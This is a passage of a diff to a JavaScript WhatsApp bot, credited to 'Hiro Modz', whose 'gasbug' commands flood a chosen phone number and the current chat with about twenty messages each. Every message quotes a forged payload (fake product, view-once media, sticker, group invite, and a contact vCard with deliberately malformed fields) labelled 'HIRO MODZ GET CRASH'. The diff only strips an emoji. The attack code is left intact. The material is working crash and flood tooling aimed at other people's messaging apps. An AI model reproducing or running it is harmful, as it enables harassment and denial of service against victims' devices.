-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:ftoko1})
 await m.reply(`Succes`)
 break
 case 'gasbug7':
@@ -5985,26 +5985,26 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:foncevid1})
 await m.reply(`Succes`)
 break
 case 'gasbug8':
@@ -6021,26 +6021,26 @@ viewOnce: true
 },
 },
 };
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fonceimg1})
 await m.reply(`Succes`)
 break
 case 'gasbug9':
@@ -6058,26 +6058,26 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupName": "P",
 "caption": `© Hiro Modz`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fgc1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fgc1})
 await m.reply(`Succes`)
 break
 case 'gasbug10':
@@ -6106,26 +6106,26 @@ let stic1 = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
- haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
+ haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:stic1})
  await m.reply(`Succes`)
  break 
 case 'gasbug11':
@@ -6140,26 +6140,26 @@ message: { "contactMessage": {
 "displayName": `© Hiro Modz`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:fkon1})
 await m.reply(`Succes`)
 break
 case 'gasbug12':
@@ -6181,26 +6181,26 @@ participant: `0@s.whatsapp.net`,
 }
 }
 }
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH 😈"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
+haikal.sendMessage(m.chat, {text:"HIRO MODZ GET CRASH"},{quoted:finv1})
